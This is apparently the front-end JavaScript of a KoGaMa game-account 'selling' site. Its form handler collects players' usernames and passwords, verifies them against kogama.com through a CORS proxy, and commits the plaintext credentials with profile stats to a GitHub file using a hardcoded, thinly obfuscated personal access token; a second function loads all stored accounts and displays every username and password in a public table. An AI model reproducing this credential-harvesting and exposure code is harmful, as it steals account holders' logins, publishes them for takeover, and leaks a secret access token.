document.getElementById('current-year').textContent = new Date().getFullYear();
document.getElementById('sort-filter').addEventListener('change', function () {
    const value = this.value;
});
document.getElementById('type-filter').addEventListener('change', function () {
    const value = this.value;
});
document.getElementById('sell-form').addEventListener('submit', function (e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    fetch('https://corsproxy.io/?url=https://www.kogama.com/auth/login/', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/json'
        },
        body: JSON.stringify({
        username: username,
        password: password
        })
    })
    .then(response => {
        if (response.ok) {
            return response.json();
        }
        else {
            document.getElementById('result-status').textContent = 'Couldn\'t validate account.';
            document.getElementById('result-status').style = 'color: red;';
            return;
        }
    })
    .then(data => {
        fetch(`https://corsproxy.io/?url=https://www.kogama.com/profile/${data.data.id}/`)
        .then(response => {
            if (response.ok) {
                return response.text();
            }
            else {
                return;
            }
        })
        .then(html => {
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, 'text/html');
         const scripts = Array.from(doc.getElementsByTagName('script'));
         let userData = null;
         scripts.forEach(script => {
             const content = script.innerHTML;
             if (content.includes('options.bootstrap')) {
                 const match = content.match(/options\.bootstrap\s*=\s*(\{[\s\S]*?\});/);
                 if (match && match[1]) {
                    userData = JSON.parse(match[1]);
                     const accountData = {
                         username: data.data.username,
                         password: password,
                         level: data.data.level,
                         xp: data.data.xp,
                         gold: data.data.gold,
                         streak_count: data.data.streak_count,
                         friends: userData.object.friends,
                         account_type: 'Community',
                         creation_date: userData.object.created
                     };
                     registerAccountOnGitHub(accountData);
                 }
            }
        });
        });
    })
});
function registerAccountOnGitHub(accountData) {
    const githubToken = ('github_pat_11BVZKXOY0pPNOtn9wMrOd_L61WNAyhajLJgnb3u?E0u7uQohua?Nm3Vm6AeW?PDxdneX3K7XBIA39MfqOPoL').replaceAll('?', '');
    const repoOwner = 'G0DNESS';
    const repoName = 'KoGaMa-Account-Interchange';
    const filePath = 'accounts.json';
    fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`)
        .then(response => {
            if (response.ok) {
                return response.json();
            } else if (response.status === 404) {
                return Promise.resolve({ content: '[]', sha: null });
            }
            throw new Error('Error fetching file');
        })
        .then(data => {
            const accounts = JSON.parse(atob(data.content || '[]'));
            accounts.push(accountData);
            const updatedFileContent = btoa(JSON.stringify(accounts));
            const requestData = {
                message: 'Register new account',
                committer: {
                    name: 'G0DNESS',
                    email: 'ddocskogama@yahoo.com'
                },
                content: updatedFileContent,
                sha: data.sha
            };
            return fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
                method: 'PUT',
                headers: {
                    'Authorization': `Bearer ${githubToken}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestData)
            });
        })
        .then(response => {
            if (response.ok) {
                document.getElementById('result-status').textContent = 'Account successfully sold.';
                document.getElementById('result-status').style = 'color: green;';
                return response.json();
            }
        })
}
let allUsers = [];
function fetchAllUsersAndListStats() {
    const githubToken = ('github_pat_11BVZKXOY0pPNOtn9wMrOd_L61WNAyhajLJgnb3u?E0u7uQohua?Nm3Vm6AeW?PDxdneX3K7XBIA39MfqOPoL').replaceAll('?', '');
    const repoOwner = 'G0DNESS';
    const repoName = 'KoGaMa-Account-Interchange';
    const filePath = 'accounts.json';
    fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
        headers: {
            'Authorization': `Bearer ${githubToken}`
        }
    })
    .then(response => {
        if (!response.ok) throw new Error('Failed to fetch file');
        return response.json();
    })
    .then(data => {
        const decodedContent = atob(data.content || '[]');
        const users = JSON.parse(decodedContent);
        allUsers = users.map(user => ({
            Username: user.username,
            Password: user.password,
            Level: user.level,
            XP: user.xp,
            Gold: user.gold,
            Streak: user.streak_count,
            Friends: user.friends,
            Type: user.account_type,
            Created: user.creation_date
        }));
        applyFiltersAndRender();
    })
    .catch(error => {
        document.getElementById('user-stats').innerHTML = `<p class="no-results">Error loading accounts.</p>`;
    });
}
function applyFiltersAndRender() {
    const statsContainer = document.getElementById('user-stats');
    const sortValue = document.getElementById('sort-filter').value;
    const typeValue = document.getElementById('type-filter').value;

    let filteredUsers = allUsers.filter(user => {
        if (typeValue === 'all') return true;
        return user.Type.toLowerCase() === typeValue;
    });
    filteredUsers.sort((a, b) => {
        const dateA = new Date(a.Created);
        const dateB = new Date(b.Created);
        return sortValue === 'newest' ? dateB - dateA : dateA - dateB;
    });
    if (filteredUsers.length === 0) {
        statsContainer.innerHTML = `<p class="no-results">No results found.</p>`;
        return;
    }
    const formatDate = (isoString) => {
        const date = new Date(isoString);
        return new Intl.DateTimeFormat('en-US', {
            month: '2-digit',
            day: '2-digit',
            year: 'numeric',
            hour: 'numeric',
            minute: '2-digit',
            hour12: true
        }).format(date);
    };
    const tableHTML = `
        <table class="stats-table">
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Level</th>
                    <th>XP</th>
                    <th>Gold</th>
                    <th>Streak</th>
                    <th>Friends</th>
                    <th>Type</th>
                    <th>Created</th>
                </tr>
            </thead>
            <tbody>
                ${filteredUsers.map(stat => `
                    <tr>
                        <td>${stat.Username}</td>
                        <td>${stat.Password}</td>
                        <td>${stat.Level}</td>
                        <td>${stat.XP}</td>
                        <td>${stat.Gold}</td>
                        <td>${stat.Streak}</td>
                        <td>${stat.Friends}</td>
                        <td>${stat.Type}</td>
                        <td>${formatDate(stat.Created)}</td>
                    </tr>
                `).join('')}
            </tbody>
        </table>
    `;
    statsContainer.innerHTML = tableHTML;
}
const formatDate = (timestamp) => {
  const date = new Date(timestamp);
  const year = date.getUTCFullYear();
  const month = String(date.getUTCMonth() + 1).padStart(2, '0');
  const day = String(date.getUTCDate()).padStart(2, '0');
  const hours = String(date.getUTCHours()).padStart(2, '0');
  const minutes = String(date.getUTCMinutes()).padStart(2, '0');
  const seconds = String(date.getUTCSeconds()).padStart(2, '0');
  const timezoneOffset = '+00:00';
  return `${year}-${month}-${day}T${hours}:${minutes}:${seconds}${timezoneOffset}`;
};
document.addEventListener('DOMContentLoaded', fetchAllUsersAndListStats);
document.getElementById('sort-filter').addEventListener('change', applyFiltersAndRender);
document.getElementById('type-filter').addEventListener('change', applyFiltersAndRender);